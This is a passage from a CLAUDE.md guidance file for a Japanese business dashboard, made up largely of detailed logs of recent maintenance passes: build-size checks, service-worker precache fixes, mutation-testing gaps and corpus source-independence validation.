# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

> **🆕 セッション引継ぎ:** 新しい Claude Code セッションを開始した場合、
> まず [`docs/SESSION_HANDOFF.md`](docs/SESSION_HANDOFF.md) を読んでください。
> 進行中タスク・確立されたパターン・既知の罠・残作業を簡潔にまとめています。
> `.claude/settings.json` の SessionStart hook (`scripts/session-context.cjs`)
> が自動でこのファイルの存在を案内します。

## Project

Service Hub — a Japanese-facing business dashboard exposing **76 services** through a unified,
category-grouped sidebar (おすすめ / 士業連携 / 分析・ツール / 外部サービス連携). **Not every service has a sidebar
entry of its own**: `uber-eats` and `demae-can` are consumed inside the Business Dashboard instead
(`BusinessPage.tsx` reads their snapshots directly). That split is a reasoned, bidirectional ledger in
`src/renderer/__tests__/sidebarCoverage.test.ts` — a service that silently loses its sidebar entry fails
CI (it would also become impossible to delete its saved credentials from the UI), and an id that is
still in the ledger while back on the sidebar fails too. Services span third-party SaaS
(GitHub, WordPress.com, Atlassian, Notion, Google Drive / Calendar / Gmail, Slack, Canva,
Microsoft 365, Dropbox, Salesforce, Discord, Asana, Linear, Sentry, Shopify, Stripe, LINE), local
tools (Skills, Security, Cloudflare, Emotions, Ollama, KPI, Stocks, Storage), business operations
(Home, Business Dashboard, Team Radar, Templates, Library, Settings, Quality), food delivery
(Uber Eats, 出前館), investment (Real Estate 不動産投資, Mutual Funds 投資信託) and eight 士業
professional integrations (税理士 / 公認会計士 / 社労士 / 弁護士 / 司法書士 / 行政書士 / 中小企業診断士 / 弁理士)
with a verified 事業仕分け duty map (`professionalMap.ts`) and a local-first CRM.

**Two runtime targets ship from the same codebase:**
1. **Electron desktop app** (`npm run dev` / `npm run build`) — full OS integration, 3-process model.
2. **Browser standalone** (`npm run build:web` → `dist/standalone.html`) — a single self-contained HTML
   file (実測 11.41 MiB full / 3.22 MiB `build:web:lite` mobile variant — ****2026-09-26 パス 481 後も 11,971,909 B / 3,384,533 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 2 本・`__tests__/` 1 本 (新設)・`ontology/`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`d16a821c…` / `6adc1840…`)。**新しいセッションが最初に読む greeting が、ゲートと違う検査数を名乗っていた。** compaction 後の要約が「hook は 16065・表は 16064 —— `verify:arch` が落ちるかもしれない」と旗を立て、**予想せず門に訊いた**ら `verify:arch` は緑で、**誤っていたのは greeting の側**だった。`countStaticIts` (ゲート) は `.test.ts` を `/^\s+it\(/` で数えるのに、hook は写しを持ち **`.ts|.tsx` を `/^\s*it\(/`** で数えていた。差を軸ごとに分けると **針の軸 0 件 / 母集団の軸 1 件** —— `src/renderer/__audits__/malformedFieldSweep.audit.ts` は `vitest.audit.config.ts` だけが拾うので **`npm test` も CI も 1 度も走らせない**。★ **`countStaticIts` の docblock がこの失敗を名指ししていた** (「数え方を写すと『どちらが正しいのか分からない 2 つの数』になる」) のに **export されていなかった**ので写しは必然で、docblock が名指す 2 か所目 (「CLAUDE.md の `~N tests`」) も古かった。★ **パス 370 の「守る順番の逆転」の 1 段外側** —— あのパスは hook の**コマンドの形**と**script の実在**を守ったが、**その script が何を刷るか**は誰も見ていなかった。直しは export して hook がゲートの関数を読む形 (**読めなければ `?`** —— 推測した数を名乗らない)。機械は `shared/__tests__/sessionGreetingNumbers.test.ts` (**6 件** —— greeting を**実際に走らせて**ゲートと突き合わせる・母集団は**独立に**数え直す)。★ **対照 8 方向・7 つが狙った層に当たり、1 つは報せ** (A 直す前の写しへ戻す = **greeting 16071 / ゲート 16070 で欠陥がそのまま再現** ❌2 / E 針を `\s*` へ = **鳴らない** —— 列 0 の `it(` が 0 件なので観測できない。**鳴らない対照は合格ではなく報せ**)。★ **ゲートが私の既知の罠を 2 つ捕まえた**: 予防的な `eslint-disable` (パス 418 と同じ) と、**docblock に挟んだ U+200B を `lint:charset` が鳴らした** (パス 461 とまったく同じ罠 —— 同じ目的で `vitest.audit.config.ts` が使うのは門が通す U+200D で、隣の字を写し間違えた)。`verify:all` は `&&` なので、鳴った 12 番目から先の 25 ゲートは 1 度も走っておらず、直してから全部を回し直した。`typecheck` 緑・`npm test` **913 / 19,268**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は触っていない)。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-26 パス 480 後の計測: 11,971,909 B / 3,384,533 B (byte 数は不変だが md5 は動いた** —— `dbc96561…` → **`d16a821c…`** / `c01f17e4…` → **`6adc1840…`**。原因は `eraseAll.ts` の `'service-hub-v2'` → `'service-hub-v3'` で、**どちらも 14 字なので最小化後の長さが同じ**。パス 415 の「**「size が同じ」と「同じ物」は別**」がまた当てはまった —— だから**両方を組んで md5 まで見る**。`sw.js` は出荷物に入らない (実測 0 件)・`laws.ts` も tree-shaking で落ちる。**公開サイトの入口がスマホ向けの版を 1 度も名乗らず、しかもランディングを開いただけで gzip 3.87 MiB を負っていた。** **見つけ方**: 利用者から「サイトを徹底的に解析して」と言われ、`pages.yml` が publish する物から読み直した。実測 (2026-09-26 · gzip は GitHub Pages が text/html に実際に掛ける形):

| publish される物 | 生 | gzip |
| --- | ---: | ---: |
| `_site/app.html` (フル版) | 11,971,909 B | **4,056,514 B** |
| `_site/standalone.html` | 同じ byte | 同 |
| `_site/lite.html` (軽量版) | 3,384,533 B | **982,003 B** |

**4.13 倍。** そして**同じ workflow が軽量版を publish する理由を自分で書いている** —— 「スマホ用ライト版: /lite.html (10MB のフル版はスマホ回線で開けないため)」。ところがランディング (= 公開サイトの根) を組んで数えると **`href` 81 件のうち 76 件が `app.html`** (見出し 2 + カード 74)・**`lite` の言及 0 件**・`manifest` の `start_url` も `./app.html`・`sw.js` の precache も `./app.html`。★ **自分が「開けない」と書いた版しか差し出していなかった** —— 軽量版は publish されていて実機の E2E も同じ件数を通しているのに、URL を打ち込む以外に届く道が 1 つも無い (逃げ口が「壊れている」のではなく**最初から扉が無い**形 · パス 364 と同じ側)。README は `npm run build:web:lite` という**コマンド**に触れるだけで URL は書かず、その大きさを「約 2.7 MB」と言う (実測 3.38 MB)。★★ **2 つ目 —— 入口を開いただけで 3.87 MiB を取っていた**: `PRECACHE` の 1 件目が `./app.html` で、`install` は `inject-pwa` が登録を差し込んだ**全頁**で走る。gzip の内訳は `app.html` 4,056,514 B / `index.html` 8,906 B / `manifest` 355 B / `icon.svg` 309 B = 合計 4,066,084 B で、**99.76% が 1 ファイル**。★★ **しかも `Cache.addAll` は原子的である —— 実 chromium で測った** (仕様の引用ではない):

| 当てた形 | 結果 |
| --- | --- |
| `addAll(['ok.txt','big.txt'])` 全部成功 | 2 件ともキャッシュへ |
| `addAll(['ok.txt','boom'])` 1 件が 500 | **`TypeError: Failed to execute 'addAll' on 'Cache': Request failed`・キャッシュは 0 件** |
| 個別の `add()` を `allSettled` | fulfilled / rejected・**ok.txt は残る** |

つまり回線が細くて `app.html` の取得が落ちる場面 —— precache が要るとされたまさにその場面 —— では **9.6 KiB のシェルまで一緒に捨てられていた。費用は払い終えて、効き目は 0 である。**★ **しかも軽量版の利用者も同じ費用を払っていた** —— `pages.yml` は `inject-pwa` を `_site/index.html` / `app.html` / **`lite.html`** の 3 本へ当てるので、`lite.html` を開いた人も同じ `sw.js` を登録し、その `install` が `app.html` を取っていた。**スマホ向けに用意した版を選んでも、背景でフル版が降ってきていた。**★★ **3 つ目 —— その欠陥には、それを要求する検査が在った**: `renderer/__tests__/serviceWorker.test.ts` の `it('install はアプリシェルを先読みする')` が `expect(all).toContain('./app.html')` と主張していた —— **題名は「シェル」なのに、要求していたのはアプリ本体そのもの** (法則 `no-weakness-as-spec`)。しかも `install` の検査は `shared/__tests__/serviceWorker.test.ts` 側には**1 件も無く**、harness は `install` を取り出しておらず cache スタブに `addAll` すら無かった (叩いても undefined で投げ `.catch` が飲む) —— **precache は検査の中で黙って何もしない状態**だった。**直し**: ① ランディングが軽量版を名乗る (見出し + フッター) ② 説明は**何が違うか**を先に言い (学術コーパス非搭載)、**大きさは測れたときだけ名乗る** (builder は `build:web` と独立に走れるので、古い数を書き写さない) ③ **precache はシェル 3 件だけ** (gzip 合計 9,570 B) —— アプリ本体は network-first の `fetch` ハンドラが**実際に開かれた時点で**焼く ④ **オフラインの遷移先を「手元に在る物の順」に** (`app.html` → `index.html`)。以前は `app.html` ただ 1 つで precache が落ちた端末では素の網エラーだったので、**どの場合も以前より悪くならない** ⑤ **キャッシュ版を v2 → v3** —— `activate` が古い世代を捨てるので既存の端末から以前の precache (生 11.97 MB) を回収する。回収は disk の都合だけではない: Cache Storage はオリジンの保存枠を食い、立ち退きは**暗号化されたトークンごと**持っていく (`storageDurability.ts` / パス 351) ⑥ 欠陥を仕様にしていた検査を反転。★ **機械は 3 層** —— `shared/__tests__/mobileEntryPointReachable.test.ts` (**12 件**) が母集団を `pages.yml` の CSP ステップの `--app` から導き (手で並べない)、行ごとに**どう辿れるか** (`entry-link` / `alias`) を理由つきで名乗らせ**両方向**。`entry-link` は**実際に組んだランディング**へのリンクで確かめる (ソースを grep すると注記の言及で満たされる)。`shared/__tests__/serviceWorker.test.ts` (10 → **18 件**) は harness に `install` / `activate` と `addAll` を足して**振る舞いで**見る。`scripts/build-landing.cjs` の `selfCheck` には床 —— 2 か所で名乗らないと**ビルドが断る**。★ **対照 9 方向すべて鳴り、それぞれ狙った層に当たる** (**A' ランディングを直す前の姿へ** census ❌2 + **`build:landing` が exit 1 で断る** (決定的) / **B PRECACHE に app.html を戻す** SW の振る舞い ❌2 + census ❌1 (**欠陥の再現**) / C オフラインの遷移先を app.html だけへ ❌1 / D 台帳から 1 行消す ❌1 / E lite のリンクを 1 か所だけに ❌1 + ビルドが断る / F 説明から「何が違うか」を落とす ❌2 / G キャッシュ版を v2 へ戻す ❌2 / H alias を link する ❌1 / **I 4 本目を publish して台帳に書かない** ❌1 (逆向き))・復帰後 **30 / 30**。★ **対照 A が私の検査の欠陥を 1 つ暴いた** —— 「選択の説明」の検査は `buildChoiceNote` を**関数として**呼ぶだけで、その出力が HTML に入っているかを見ていなかった (直す前の姿へ戻しても**通った** —— 法則 `mention-vs-declaration` の、自分の検査の中での現れ)。組んだ HTML を見る `it` を足して A' は ❌2 になる。★ **ゲートが 4 つ捕まえた —— どれも設計どおり**: ① **`absenceSampleCensus`** —— 台帳の理由に置いた `not.toMatch(/^(同上|TBD|…)/)` に標本が無かった (**CLAUDE.md の規約そのもの**)。針が禁じたい文面に当たることと、実物の理由が広すぎる針で拾われないことを同じ `it` で主張する形に直した ② **整合性チェーンの閉包検査** —— `scripts/build-landing.cjs` を保護対象へ入れた瞬間に「保護対象が `scripts/lib/json-for-script.cjs` を読んでいるのに、そちらは保護対象でも除外台帳でもない」と鳴った (パス 402 / 410 と同じ形で**判定が保護の外に出ていた**)。中身は `</` + `script>` の閉じ込みを防ぐ関門で、読み手は実測 **7 本** (landing・デモ 3 本・配る maker 3 本) —— **公開・配布する HTML のほぼ全部**が通る。保護対象 95 → **97**・block **#267 / #268** ③ **`lint:storage` の両方向** —— キャッシュ名を上げたので「台帳に無い保存先 / 台帳にあるが実在しない保存先」を名指しし、直すと今度は**規則 11** (ハードリセットが台帳の全行を覆う) が `eraseAll.ts` の古い名前を名指しした。台帳・在庫・消し方を揃えた ④ `verify:arch` のユニットテスト数 16046 → **16064** (**今回も予想せず門に訊いた**)。★ **測って何も無かった軸も記録する**: ① **`manifest.webmanifest` の「74 サービス」は正しい** —— `SERVICE_IDS` は 76 だが `SERVICES` (サイドバー) は 74 で、その文は「74 サービスを 1 つのサイドバー UI に統合した」と言う。**しかも既に機械が在った** (`renderer/__tests__/serviceWorker.test.ts` の末尾が manifest の数を実物へ縛っており、2026-08-25 に「64」だった古びを直している)。★ 私は最初これを欠陥だと見立てた —— 測って**正しい文を「直す」ところだった** (法則 `measure-before-claim`) ② **`_site` へ publish する HTML 7 本はどちらのゲートにも漏れなく載っている** —— `lint-sample-data --artifact` と `lint-artifact-csp` の引数は手書きが 3 つ並ぶが実測では 3 つとも一致していた (今日の欠陥ではない) ③ **`assets/icon.svg` / `og.png` はどのゲートも走査していないが実行面を持たない** (`icon.svg` は `<link rel="icon">` として読まれるだけでスクリプトは走らない)。法則 **98 本目** `published-build-is-reachable`。`typecheck` 緑・`npm test` **912 / 19,262**・`verify:all` exit 0・`chain:verify` 緑 (block 269・保護対象 97)。**出荷物の中身が動いたので実機も回した**: `perf` OK (LITE DCL 239 ms / heap 10.2 MB・FULL DCL 667 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **58 回目**でもあり、今回も再現しなかった)。★ **1 度目の `e2e` (FULL) はログが 39,177 byte で途切れており、終了コードを読めなかった** —— 「落ちた」と書くのも「通った」と書くのも測っていないことになるので**単独で回し直した** (455 件 / exit 0)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・— ****2026-09-26 パス 479 後も 11,971,909 B / 3,384,533 B で byte 単位で不変 (md5 も同一)** (直したのは `scripts/` 2 本 (新設 1)・`__tests__/` 2 本 (新設 1)・`package.json`・`docs/` だけ —— **出荷コードは 1 行も動いていない**。それでも**両方を組んで md5 まで見た** (`dbc96561…` / `c01f17e4…`)。**パス 478 は `mutate` に載っているファイルを break 閾値の下へ落として push しており、per-PR の網は 1 つも鳴らなかった。** **見つけ方**: パス 478 が残作業に書いた「`sourceVerification.ts` も `mutate` の外に居る (実測)」を確かめに行ったら、**その「(実測)」が偽だった** —— 実物は `stryker.config.json` の 147 行目に**載っている** (法則 `measure-before-claim` の当のこと)。載っているなら `thresholds.break = 99.8` が掛かる。実測 (2026-09-26 · `npx stryker run --mutate src/renderer/data/sourceVerification.ts`):

| | |
| --- | --- |
| パス 478 の push 時点 | **98.92% / 未到達 1** —— **`break` を割る** |
| 未到達だった 1 件 | `String(url ?? '')` の `?? ''` (欠けた欄へ到達する検査が無かった) |
| 検査を 2 件足した後 | **100.00% (Killed 93 / 生存 0 / 未到達 0)** |

★ **測定は週次だけ** (`mutation.yml`) なので、**赤は 6 日後に出て、しかも次に push した人の変更に見える。** これは「起こりうる」ではなく**push 済みの状態**だった。★ **per-PR の網が見なかった理由も測った**: ① `npm run test:cov` の母集団は **`src/main/**` だけ** (`--coverage.include`) で、`mutate` 298 件のうち **247 件がその外**に居る (税の計算 60 本以上・保管庫 9 本・プロキシ・コーパスの確証器・両ビルドが読む `shared/` の判定) ② **被覆の閾値はどこにも宣言されていない** (`vitest.config.ts` に `thresholds` は 0 件・CLI も渡さない) —— 実測 Stmts **98.76%** / 分岐 **96.68%** を**刷るだけ**で、下がっても鳴らない (法則 `count-has-floor`) ③ ★★ **そして閾値を足してもこの欠陥は捕まらない** —— 分岐は **1,903 本**なので **1 本 = 0.05%**。1 点の床でも 19 本落ちるまで鳴らない。**だから直しは「床を足す」ではなく「触ったファイルを測る」である。****直し**: ① 未到達だった枝に検査 2 件 —— 契約は「**欠けた欄と空文字は同じ鍵**」(そうでないと `String(null)` が `'null'`、`String(undefined)` が `'undefined'` という**別々の非空の鍵**になり、「url が無い出典 2 件」が独立 2 件として通る。畳めば必ず床に当たる = fail closed) ② **`npm run audit:mutate-changed`** (定期点検の道具 **9 本目**) —— 変更したファイル (既定は `HEAD~1` との差 + 作業ツリー + staged) と `mutate` の**積**を取り、その集合だけに Stryker を当てる。0 件なら何もせず exit 0。**CI では走らせない** (1 ファイル 6 分半なので毎 PR には載せられない —— 回すのは触ったパス自身)。実測: **パス 478 の差分に当てると `sourceVerification.ts` ただ 1 件を名指しする** —— **この道具が在れば、パス 478 はその場で気づけた** ③ 照合は**道の完全一致** (同じ basename のファイルは別の場所にも在る) ④ **後片付けは `finally`** —— `incremental: true` なので古い `.stryker-incremental.json` は**偽の生存**を作る (config が 2026-08 の実例を持つ: `atlassian.ts` が「生存 1」と誤報された) ⑤ **走査の故障を「対象なし」と読まない** (`mutate` が空なら断る) ⑥ **手で回す `audit:*` は CLAUDE.md の命令の一覧に在る**を両方向の検査に (**書いていない道具は誰も回さない**。実測 12 件のうち CI が回す `audit:report` だけが例外で、その行は `dependency-audit.yml` が実際に呼んでいることまで見る)。★ **対照 8 方向すべて鳴り、それぞれ狙った層に当たる** (**A 新しい検査 2 件を外す = 決定的**: 変異検査 **98.92% / 未到達 1** ↔ 戻すと **100.00%** / B' 照合を basename へ ❌1 + self-test ✗1 / C CLAUDE.md の一覧から外す ❌1 / D `audit:*` を `verify:all` へ ❌1 / E `finally` の後片付けを外す ❌1 / F `test:cov` の include を `src/**` へ広げる ❌1 / G 呼んでいない workflow を名乗る (逆向き) ❌1 / H `mutate` を空にする 道具が **exit 1** で断る)・復帰後 **10 / 10** + self-test 全件一致。★ **自戒 2 つ**: ① **B は 1 度目、鳴らなかった** —— 最初の標本は `…/sourceVerificationHelper.ts` で「接頭辞では拾わない」を主張していたが、`mutate` の項は拡張子まで含むので `sourceVerification.ts` はその接頭辞ではない (`.ts` が途中に来る)。**鳴らない対照は合格ではなく、その検査についての報せ**なので、実際に起こりうる誤り (basename での比較) を撃つ標本へ当て直した ② **H の終了コードを `| tail -2` の後ろの `$?` で読んで「exit=0」と見た** —— **パイプは終了コードを嘘にする** (パス 454 と同じ罠)。ファイルへ落として測り直すと exit 1。★ **ゲートが 2 つ捕まえた —— どちらも設計どおり**: `lint:forbidden` が新しい道具の子プロセスを「台帳に無い例外」として鳴らした (理由つきで登録・例外 55 → **56** 件) / `verify:arch` のユニットテスト数を 16034 → **16046** へ (**今回も予想せず門に訊いた**)。★ **測って何も無かった軸も記録する**: ① **コーパスの `minAuthoritative` の側は設計どおり** —— `reference` (百科事典級) を権威に数えるのは `isAuthoritativeSource` の docblock が明示しており、実測で `reference` だけで裏付ける項目は **336 件** (+ `reference` + `media` が 87 件)。**12% が設計なので欠陥ではない** ② **動画 / SNS / AI 集約の出典は 12,200 出典のうち 1 件だけ** (`medium.com`・正しく `media` = 権威に数えない側)。YouTube / TikTok / Perplexity / ChatGPT / Gemini / Claude / Reddit / Quora / X / note / Qiita / Zenn / SlideShare を総当たりして **0 件** —— `isDiscoveryOnly` は出荷コードの読み手が 0 件だが**守る対象が無い**ので罠であって生きた欠陥ではない ③ **正規化を「クエリまで畳む」へ広げるのは誤り** —— 8 項目が該当するが、どれも CELEX ID / SSRN の abstract_id / AEA の article id / ERIC の id で**別の文書**を選んでいる (パス 478 の「クエリは畳まない」をこの測定が裏づけた) ④ **インボイスの経過措置は台帳と実装が一致** (コーパス 2 項目と `INVOICE_TRANSITION_STAGES` が令和 8 年度税制改正後の 80→70→50→30% で揃い、出典は国税庁の改正特集を含む)。`lint:rate-freshness` は**2割特例の期限まで残り 4 日**を既に警告しており (2026-09-30)、3割特例の実装も在る ⑤ **`knowledgeProvenance.ts` は今も測っていない** (`mutate` の外・`measure-next` の 32 件に居る) ——「測っていない」と「測ったら 100%」は別なので、そう書いて残す。`typecheck` 緑・`npm test` **911 / 19,242**・`verify:all` exit 0・`chain:verify` 緑 (保護対象は 1 つも触っていない)・`sourceVerification.ts` の変異検査 **100.00%**。**実機は回していない** —— 出荷物が 1 byte も動いておらず md5 も同じなので)・****2026-09-26 パス 478 後の計測: 11,971,909 B / 3,384,533 B (FULL +108 B・**LITE +213 B** —— ★ **LITE のほうが大きく増えるのは、FULL だけがコーパスの行を 1 本落としたため**。共有の判定 (`sourceVerification.ts` / `knowledgeProvenance.ts`) は両ビルドが読むので +213 B ずつ増え、**FULL はそこからコーパスの差 −106 B** (消した `Data_feminism` の 1 行 369 B と、差し替えた出典のラベル 263 B の差・実測) を引く。213 − 106 = 107 で**測ったのは 108** —— 残る 1 B は最小化の正規化である。**md5 も見た** (`dbc96561…` / `c01f17e4…`)。直したのは `renderer/data/` 3 本 (確証器 2 + コーパス 2 項目)・`scripts/` 3 本 (新設 1)・`__tests__/` 5 本 (新設 1)・`ontology/`・`docs/`。**知識コーパス 4,039 項目の価値はまるごと採用ゲートに乗っているのに、その「独立 2 出典」は件数しか数えていなかった。** **見つけ方**: パス 477 は除外台帳の理由を機械で検めた。同じ問い (「散文が名乗る事実を誰が検算しているか」) を**コーパスの採用ゲート**へ当てた —— `EvidenceSource.url` の注記は「**独立性の判定キー**」と宣言しているのに、`独立` を実装していたのは 3 つのうち 1 つだけだった:

| 確証器 | 母集団 | `独立` を検めるか |
| --- | --- | --- |
| `sourceVerification.distinctSourceCount` | compliance / subsidy / support | **はい** (URL で重複を落とす) |
| `knowledgeProvenance.assessEvidence` | academic / econ-history | **いいえ** —— `sources.length` を素で数えていた |
| ゲート `verify-knowledge-provenance.cjs` の `assess` | 全 5 コレクション | **いいえ** —— 同じく `types.length` |

★ **実測 (2026-09-26 · 4,039 項目)**: 素の文字列で重複する出典を持つ項目は **0 件** (だから欠落そのものは罠に見えた) —— ところが**同じ文書を指す綴りの組**を持つ項目が **2 件**在った:

| 項目 | 出典 | 実際 |
| --- | --- | --- |
| **`academic/bizlaw-equitable-set-off`** | `…/wiki/Set-off_(law)` と `…/wiki/Set-off_(law)#Equitable_set-off` | **フラグメントはサーバへ送られない**ので 1 つの文書 —— **裏付けは実質 1 件だった** |
| `academic/infosoc-data-feminism` | `…/wiki/Data_Feminism` と `…/wiki/Data_feminism` | 1 文字の大小だけ違う実質同じ頁 (出典 3 件で独立 2 件) |

★ **1 件目のラベルは `Wikipedia: Set-off (law)` と `Wikipedia: Equitable set-off`** で、読む側には 2 件に見えた。**決定的な対照** (ゲートを `types.length` へ戻し、コーパスを節のアンカーへ戻して本検査だけ回す): `確証ゲート検証: 4039 項目（出典 2+・権威 1+）` + `✅ すべての項目が確証ゲートを満たしています` + **exit 0** —— **1 件の出典が 2 件として通った。** ★ **この規律はコーパスの価値そのもの** —— CLAUDE.md は「確証のとれない情報は `unconfirmed` として**破棄**する」と述べ、そのコーパスは AI オーケストレーションの文脈として役員ロールへ注入され、7,402 ノートの Obsidian 保管庫にもなる。**直し**: ① `独立` の実装を **1 つ**に (`normalizeSourceUrl` + `distinctSourceCount` を `sourceVerification.ts` が持ち、`assessEvidence` とゲートの両方が通る。`.cjs` は `.ts` を require できないので写しは `scripts/lib/source-url.cjs`・パリティ検査が同じ標本を両方へ通す) ② **契約は実測で選んだ** —— 畳むのは **フラグメント / scheme / ホストの大小 / パス末尾の `/` / パスの大小 / ポート**、畳まないのは **クエリ / `www.`**。★ パスの大小とポートは最初の版では残していたが、それは**過大に数える**側で、`infosoc-data-feminism` が実測でその形だった。**過大は「偽の 2 件目を黙って受ける」(静かな誤り)、過小は「正当な項目を落とす」(騒がしい誤り)** —— 静かな方を避ける ③ **3 つ目の実装が在ったので畳んだ** —— `lint-citations.cjs` が同名の関数を**違う契約で**持っており (見つけたのはパス 325 の `parsedUrlGateCensus`)、13 標本のうち **6 つで答えが割れ**、コーパスの 1 項目が実際にその差の上に居た。正しい側 (パスを小文字化・`hostname`) を採って実装を 1 つへ ④ **コーパス 2 件を直した** —— `bizlaw-equitable-set-off` は `…/wiki/Liquidated_damages` (Hanak v Green [1958] 2 QB 9 以降の判例法理を述べる**別の頁**・WebSearch で確証) へ差し替え、`infosoc-data-feminism` は大小だけ違う 1 行を落とした ⑤ **「列挙した件数 = 独立した文書の数」を不変条件にした** —— 「独立が下限以上」は**3 件並べて実は 2 件**という形を通す (独立 2 件で床を満たす) ので、**数え方を直しても名乗りは直らない**。失敗の向きは騒がしいので、1 つの文書の 2 か所を正当に引きたい編者は名指しで落ちて理由つきの例外を書くことになる (今日 0 件)。★ **対照 9 方向すべて鳴り、それぞれ狙った層に当たる** (A `assessEvidence` を素の件数へ ✗3 / B ゲートを素の件数へ ✗1 + 自己検査 exit 1 / C コーパスを節のアンカーへ ✗3 + exit 1 / **B+C (直す前の姿・本検査のみ) exit 0 + ✅ = 欠陥の再現** / D `.cjs` の写しを壊す ✗2 / E 消費者の台帳から 1 行消す (逆向き) ✗1 / F `.ts` が畳み過ぎる (クエリを落とす) ✗3 / G ゲートが自前の正規化を持つ ✗1 / H `normalizeSourceUrl` が生を返す ✗5 / **I コーパスに `Data_feminism` を戻す ✗2・ゲートは exit 0**)・復帰後 **14 / 14**。★ **I が層の分担を示す** —— ゲートは床しか見ないので**黙り**、「独立が下限以上」の検査も**鳴らない**。鳴るのは「列挙 = 独立」の不変条件だけで、しかも名指しする (`academic/infosoc-data-feminism: 列挙 3 件 / 独立 2 件`)。★ **ゲートが 3 つ捕まえた —— どれも設計どおり**: ① **`hostInterpolationCensus` (パス 324)** —— 新しい `normalizeSourceUrl` が `https://${parsed.hostname…}` と authority の位置に補間を置くので「台帳に書け」と鳴った (理由 (b) = 解析済み `URL.hostname` の再直列化。**この文字列は通信にも画面にも出ない** —— 独立性を数える `Set` の鍵で、読み手は `distinctSourceCount` だけ) ② **`parsedUrlGateCensus` (パス 325)** —— 新しい `new URL(` を `value-gate` として登録 (10 → **11**・台帳 26 → **27** 行が 28 か所を覆う) ③ **`commentStripperCensus` (パス 461)** —— 新しい検査が共有の `stripComments` を読むので「寄せた本」の走査が 80 → **81** になった。★ **自戒 2 つ**: ① **控えが古く、復帰で実物を 2 版前へ戻した** —— `$S/fixed` に refresh し忘れた写しが 1 つ残っており、`restore.sh` は全ファイルを走るので `sourceVerification.ts` が古い契約に戻った。**検査は 3 件落ちたが、narrowed な引数の型は静かに戻っていた** (vitest は型を剥がすので見たのは `typecheck` だけ —— **同じ罠で 12 度目**)。控えは**毎回作り直し**、復帰は**台帳と件数が合わなければ触らない**形にした ② **同じパスで 2 度踏んだ** (1 度目は「他のパスの写しが混ざっていた」) —— **古い写しが 1 つ残ると、復帰は実物を壊す道具になる。** ★ **測って何も無かった軸も記録する**: ① **ホスト単位の独立性の規則は実測で否定された** —— 1 ホストだけで下限を満たす項目は **169 件**で、最大の群は `doi.org` **52 件** (resolver なので 2 DOI は 2 著作) と `www.nta.go.jp` **33 件** (同じ官庁の**別の文書**)。ホスト単位にすると 120 件強が誤って落ちるので URL 単位が正しく、「Wikipedia の 2 記事」は**人が中身で判断する**ことである ② `lint:citations` の「同じ URL は同じ種別」は正規化を通していない (今日該当 **0 件**) ③ 空・解析できない URL は **0 件** (「本物 1 件 + 空 1 件」は通るが、今日届く道は無い) ④ **`bizlaw-equitable-set-off` の 2 件目は判決そのものではない** —— いちばん良い出典は `www.bailii.org` / `caselaw.nationalarchives.gov.uk` の判決全文だが、**この環境の網の方針が両ホストを塞いでおり** (`WebFetch` は `EGRESS_BLOCKED`・`curl` も 000)、**確かめていない出典は足さない**のがこのコーパスの規律である (`docs/REMAINING_WORK.md` に残した)。法則 **97 本目** `independence-counted-not-listed`。`typecheck` 緑・`npm test` **910 / 19,230**・`verify:all` exit 0・`chain:verify` 緑 (block 267・保護対象は 1 つも触っていない)・`vault:build` 7,402 ファイル・`graph:build` は生成物が byte 単位で不変。**出荷物が動いたので実機も回した**: `perf` OK (LITE DCL 153 ms / heap 10.3 MB・FULL DCL 413 ms / heap 36.9 MB)・`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** (#74 の忠実な条件の **57 回目**でもあり、今回も再現しなかった)。**`e2e:ollama` は回していない** —— main の Ollama を 1 行も触っていない)・****2026-09-26 パス 477 後の計測: 11,971,801 B / 3,384,320 B (両方 +0 B · md5 も同一)** (直したのは `scripts/` 1 本と `__tests__/` 2 本 (うち 1 本新設)・`stryker.config.json`・`ontology/`・`security/`・`docs/`、それに**出荷コードへ pragma 1 つと注記**だけ —— pragma と注記は最小化で落ちるので**出荷物は 1 byte も動かない**。それでも**両方を組んで md5 まで見た** (`fef32c62…` / `5e00fcdf…`)。**除外の理由を誰も検算しておらず、11 件のうち 3 件が偽だった —— 1 件は「定数のみ」と名乗りながら 3 つの enforcement 点が読む唯一の関門を持っていた。** **見つけ方**: パス 476 は「壁が隣の台帳へ移る」道を塞いだ。次の問いは**その台帳の理由そのもの**で、`DEP_EXCLUSIONS` の各行は理由の散文を持つのに検める物が 1 つも無かった。実測 (2026-09-26 · 11 件を 1 つずつ):

| 行 | 散文 | 実測 |
| --- | --- | --- |
| **`assistantLimits.ts`** | 「上限の定数のみ (判断は呼び出し側が持つ)」 | **関数 3 つ** (`latestTurnTooLong` / `inputTooLongMessage` / `capAssistantReply`) |
| **`serviceId.ts`** | 「現在 74」 | **76** (`SERVICE_IDS.length`) |
| **`clients/index.ts`** | 「74 エントリ」 | **76** (`LIVE_FETCHERS` のキー数) |
| 残る 8 件 | —— | どれも今日真 |

★★ **いちばん重いのは 1 行目** —— 同じ注記が「ここを書き換えたときの最悪は『上限の値が変わる』——それは値の変更であって、**関門の迂回ではない**」と述べていた。ところが `latestTurnTooLong` は **3 つの enforcement 点が読む唯一の述語**である (`main/clients/assistant.ts:143` の throw と `web-shim.ts:937` / `:1008` の err)。実測 (esbuild で組んで `return false` を先頭に足す): 上限 8,000 字に対し **素は `true` (3 点とも断る) / 潰すと `false` (3 点とも通す)** —— **値の変更ではなく関門の迂回である**。しかも `MUST_MEASURE` (壁) にも `KNOWN_UNMEASURED` にも `mutate` にも無く、**ハッシュも変異検査も掛かっていなかった**。`capAssistantReply` は `httpLimits.ts` が「10 万字で切るので、それを超えて読んだ分は必ず捨てる」と明示的に依存している。★ **これは台帳自身が記録している過去の誤りの 2 件目** ——「`clients/types.ts` の除外を2026-08-23 に外したのと同じ基準で判断した —— あちらは『型だけ』と書いてあったが**実行時の判断を持っていた**。除外の理由は『型だけに見えるか』ではなく『**実行時に残るか**』で決める」。**基準は書かれていて、機械だけが無かった。****直し**: ① `assistantLimits.ts` を**保護対象へ移した** (除外 11 → 10・保護 94 → **95**。閉包はそのまま通る —— `inputCeiling.ts` 